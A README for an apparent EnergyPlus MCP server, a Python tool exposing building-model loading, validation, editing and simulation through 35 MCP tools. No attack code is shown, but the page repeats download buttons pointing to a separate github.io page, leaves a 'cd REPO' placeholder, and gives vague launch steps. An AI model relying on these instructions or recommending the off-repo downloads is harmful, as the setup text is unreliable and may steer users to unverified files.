# EnergyPlus MCP Server v0.1.0 - Building Energy Simulation MCP Server 2026

> **EnergyPlus MCP Server is a Python implementation of the Model Context Protocol for loading, examining, changing, validating, and running EnergyPlus building models through structured tools.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felixugscooper6739/energyplus-building-server?style=flat-square)](https://github.com/felixugscooper6739/energyplus-building-server)

---

<p align="center">
  <a href="https://felixugscooper6739.github.io/energyplus-building-server/">
    <img src="https://img.shields.io/badge/Download-EnergyPlus%20MCP%20Server%20Latest-brightgreen?style=for-the-badge" alt="Download EnergyPlus MCP Server">
  </a>
</p>

> **[Download EnergyPlus MCP Server v0.1.0](https://felixugscooper6739.github.io/energyplus-building-server/)**

---

[Download Latest Build](https://felixugscooper6739.github.io/energyplus-building-server/)

---

## Overview

EnergyPlus MCP Server brings EnergyPlus building simulation capabilities to Model Context Protocol clients. Its structured tool set supports IDF model loading, inspection, validation, editing, analysis, and simulation with weather data.

The project is intended for building energy studies, HVAC exploration, and building management tasks where simulation information needs to be accessed in a consistent way. It can inspect zones, surfaces, materials, schedules, and HVAC relationships, as well as create interactive charts and system diagrams for analysis.

---

## Capabilities

- Open, validate, edit, analyze, and simulate EnergyPlus IDF files.
- Expose 35 tools for EnergyPlus model operations and simulation tasks.
- Read building zones, surfaces, materials, and schedules.
- Perform automated simulations using compatible weather files.
- Produce interactive visualizations and HVAC system diagrams.
- Identify and examine HVAC system topology.
- Automatically set EnergyPlus output variables and meters.
- Offer stdio and token-authenticated streamable HTTP transports.
- Support EnergyPlus data workflows for building simulation and management.

---

## Installation

First clone the repository and enter its directory:

```bash
git clone https://github.com/felixugscooper6739/energyplus-building-server.git
cd REPO
```

Then install the dependencies required by the project:

```bash
python -m pip install -r requirements.txt
```

Simulation features require an available EnergyPlus installation. Install the EnergyPlus version appropriate for your operating system and ensure that the server can access its executable and associated resources.

When deploying with containers, use the repository Docker setup when it is available:

```bash
docker build -t energyplus-mcp-server .
docker run --rm -i energyplus-mcp-server
```

Launch the server with the Python entry point documented by the project. An MCP client can start it through stdio, while streamable HTTP can be used when the server is deployed as a network service.

---

## Working with the Server

An EnergyPlus workflow commonly follows these steps:

1. Launch EnergyPlus MCP Server from an MCP-compatible client.
2. Load an IDF file into the active session.
3. Review zones, surfaces, materials, schedules, and HVAC elements.
4. Validate the model and make any necessary parameter updates.
5. Supply a compatible weather file.
6. Choose the output variables and meters needed for analysis.
7. Execute the EnergyPlus simulation and inspect its results.
8. Create plots or HVAC topology diagrams for additional review.

The same process can be represented as:

```text
Load IDF model
  -> Inspect building structure
  -> Discover HVAC topology
  -> Validate and modify model
  -> Select weather file
  -> Configure outputs and meters
  -> Run EnergyPlus simulation
  -> Analyze results and create visualizations
```

Each operation is exposed as an MCP tool, so the connected client or agent can choose the appropriate tool for the current stage.

---

## Runtime Configuration

Provide transport and runtime options through the server launch command or the configuration used by the MCP client.

A conceptual stdio setup is shown below:

```json
{
  "mcpServers": {
    "energyplus": {
      "command": "python",
      "args": [
        "path/to/server_entrypoint.py"
      ]
    }
  }
}
```

For streamable HTTP use, set the service endpoint and token authentication in accordance with the server entry point and deployment options included with the project.

The running process must be able to access IDF files, weather files, simulation output directories, and generated visualizations. The exact paths and environment variables vary according to the local EnergyPlus installation and the chosen deployment approach.

---

## Requirements

- A Python runtime compatible with the project's dependencies.
- EnergyPlus installed and accessible for simulation tasks.
- EnergyPlus IDF files for model-oriented workflows.
- Weather files compatible with the intended simulations.
- An MCP-compatible client.
- Docker when using a container deployment.
- Adequate storage for models, weather data, simulation results, plots, and diagrams.
- Network connectivity and a configured authentication token for token-authenticated streamable HTTP transport.

---

## Frequently Asked Questions

### What does EnergyPlus MCP Server do?

It is a Python MCP server that makes EnergyPlus model handling and simulation workflows available through structured tools.

### What file format is supported?

The server uses EnergyPlus IDF models and can inspect, validate, modify, and analyze the building information they contain.

### How many tools does the project provide?

EnergyPlus MCP Server includes 35 tools for model and simulation workflows.

### Are simulations automated?

Yes. The server can run simulation workflows using an EnergyPlus model and a compatible weather file.

### What connection methods are available?

Both stdio and token-authenticated streamable HTTP transports are supported.

### Where is the server configured?

Set the Python launch command and transport-specific options in the MCP client's configuration or in the deployment settings provided with the project.

### What can cause a simulation to fail?

Check that the IDF and weather files are present and compatible, EnergyPlus is installed and reachable, and the process can read its inputs and write the resulting simulation files.

### Where can I find updates?

Review the repository for new releases, source updates, and revised installation or deployment guidance.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
